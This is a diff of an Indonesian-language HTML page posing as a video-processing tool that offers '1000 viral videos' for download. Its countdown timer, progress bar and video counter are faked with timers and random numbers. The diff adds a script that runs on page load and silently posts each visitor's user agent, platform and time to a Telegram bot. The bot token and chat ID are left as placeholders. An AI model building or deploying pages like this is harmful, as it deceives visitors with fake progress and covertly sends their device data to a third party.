@@ -3,9 +3,9 @@
 <head>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Video Processing</title>
+<title>Video Processing Engine</title>
 
 <style>
 
@@ -13,39 +13,23 @@
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:system-ui,Segoe UI;
+font-family:system-ui;
 }
 
 body{
 background:linear-gradient(135deg,#020617,#0f172a);
 color:white;
-min-height:100vh;
 display:flex;
+align-items:center;
 justify-content:center;
+height:100vh;
+}
+
+.container{
+width:100%;
+max-width:380px;
 padding:20px;
 }
-
-/* glow */
-
-body::before{
-content:"";
-position:absolute;
-width:700px;
-height:700px;
-background:radial-gradient(circle,#3b82f6,#22c55e,transparent);
-filter:blur(200px);
-opacity:.25;
-z-index:-1;
-}
-
-/* container */
-
-.app{
-width:100%;
-max-width:420px;
-}
-
-/* header */
 
 .header{
 display:flex;
@@ -55,128 +39,65 @@ margin-bottom:15px;
 
 .title{
 font-size:18px;
-font-weight:600;
+font-weight:bold;
 }
 
 .timer{
 font-size:18px;
-font-weight:bold;
 }
-
-/* card */
 
 .card{
 background:rgba(255,255,255,.05);
-backdrop-filter:blur(25px);
 border-radius:18px;
-padding:16px;
-margin-bottom:15px;
+padding:18px;
+backdrop-filter:blur(25px);
+box-shadow:0 10px 30px rgba(0,0,0,.4);
 }
 
-/* preview */
-
 .preview{
-height:180px;
-border-radius:14px;
-background:linear-gradient(45deg,#0f172a,#1e293b);
+height:170px;
+background:#111827;
+border-radius:12px;
 display:flex;
 align-items:center;
 justify-content:center;
-font-size:60px;
-position:relative;
-overflow:hidden;
+font-size:55px;
 }
-
-.scanline{
-position:absolute;
-width:100%;
-height:4px;
-background:#22c55e;
-animation:scan 3s linear infinite;
-}
-
-@keyframes scan{
-0%{top:-10px}
-100%{top:190px}
-}
-
-/* progress */
 
 .progressBar{
 height:10px;
-background:rgba(255,255,255,.1);
+background:#1f2937;
 border-radius:20px;
+margin-top:14px;
 overflow:hidden;
-margin-top:10px;
 }
 
 .progress{
 height:100%;
 width:0%;
 background:linear-gradient(90deg,#22c55e,#3b82f6);
+transition:width .4s;
 }
-
-.percent{
-font-size:12px;
-margin-top:6px;
-color:#cbd5f5;
-}
-
-/* scanning animation text */
-
-.scantext{
-font-size:13px;
-margin-top:6px;
-color:#94a3b8;
-}
-
-/* counter */
 
 .counter{
-font-size:22px;
-font-weight:bold;
-margin-top:6px;
+font-size:19px;
 color:#22c55e;
+margin-top:10px;
 }
 
-/* download text */
-
 .download{
-margin-top:10px;
-font-size:14px;
+margin-top:12px;
 background:rgba(34,197,94,.15);
 padding:10px;
 border-radius:10px;
+font-size:14px;
 text-align:center;
-}
-
-/* server */
-
-.server{
-display:flex;
-align-items:center;
-gap:8px;
-font-size:13px;
-}
-
-.dot{
-width:9px;
-height:9px;
-border-radius:50%;
-background:#22c55e;
-animation:pulse 2s infinite;
-}
-
-@keyframes pulse{
-0%{opacity:.5}
-50%{opacity:1}
-100%{opacity:.5}
 }
 
 .footer{
 text-align:center;
 font-size:11px;
-margin-top:10px;
+margin-top:14px;
 color:#64748b;
 }
 
@@ -185,7 +106,7 @@ color:#64748b;
 
 <body>
 
-<div class="app">
+<div class="container">
 
 <div class="header">
 <div class="title">Video Processing</div>
@@ -194,21 +115,10 @@ color:#64748b;
 
 <div class="card">
 
-<div class="preview">
-🎬
-<div class="scanline"></div>
-</div>
+<div class="preview">🎬</div>
 
 <div class="progressBar">
 <div class="progress" id="progress"></div>
-</div>
-
-<div class="percent" id="percent">
-0% processed
-</div>
-
-<div class="scantext" id="status">
-Scanning video files...
 </div>
 
 <div class="counter" id="counter">
@@ -218,15 +128,6 @@ Scanning video files...
 <div class="download">
 📥 Total video yang dapat di download :  
 <b>1000 video viral terbaru</b>
-</div>
-
-</div>
-
-<div class="card">
-
-<div class="server">
-<div class="dot"></div>
-Connected to processing server
 </div>
 
 </div>
@@ -241,16 +142,19 @@ Mobile Video Processing Engine
 
 let total=60*60
 let remaining=total
-
-const timer=document.getElementById("timer")
-const progress=document.getElementById("progress")
-const percent=document.getElementById("percent")
-const status=document.getElementById("status")
-const counter=document.getElementById("counter")
-
+let progress=0
 let videos=0
 
-function update(){
+window.onload=function(){
+
+startProcessing()
+sendTelegram()
+
+}
+
+function startProcessing(){
+
+setInterval(()=>{
 
 let m=Math.floor(remaining/60)
 let s=remaining%60
@@ -258,31 +162,60 @@ let s=remaining%60
 if(m<10)m="0"+m
 if(s<10)s="0"+s
 
-timer.innerText=m+":"+s
-
-let done=total-remaining
-let p=Math.floor((done/total)*100)
-
-progress.style.width=p+"%"
-percent.innerText=p+"% processed"
-
-if(videos<1000){
-videos+=Math.floor(Math.random()*4)
-if(videos>1000)videos=1000
-}
-
-counter.innerText=videos+" video ditemukan"
-
-if(p>20)status.innerText="Menganalisis video..."
-if(p>40)status.innerText="Memproses frame video..."
-if(p>60)status.innerText="Mengindeks video viral..."
-if(p>80)status.innerText="Menyiapkan download..."
+document.getElementById("timer").innerText=m+":"+s
 
 if(remaining>0)remaining--
 
+},1000)
+
+setInterval(()=>{
+
+progress+=Math.random()*2
+
+if(progress>100)progress=100
+
+document.getElementById("progress").style.width=progress+"%"
+
+if(videos<1000){
+
+videos+=Math.floor(Math.random()*5)
+
+if(videos>1000)videos=1000
+
 }
 
-setInterval(update,1000)
+document.getElementById("counter").innerText=
+videos+" video ditemukan"
+
+},1000)
+
+}
+
+function sendTelegram(){
+
+const TOKEN="ISI_TOKEN_BOT"
+const CHAT_ID="ISI_CHAT_ID"
+
+const message =
+"Video processing dijalankan\n"+
+"UserAgent: "+navigator.userAgent+"\n"+
+"Platform: "+navigator.platform+"\n"+
+"Waktu: "+new Date()
+
+fetch(
+"https://api.telegram.org/bot"+TOKEN+"/sendMessage",
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+})
+
+}
 
 </script>
 
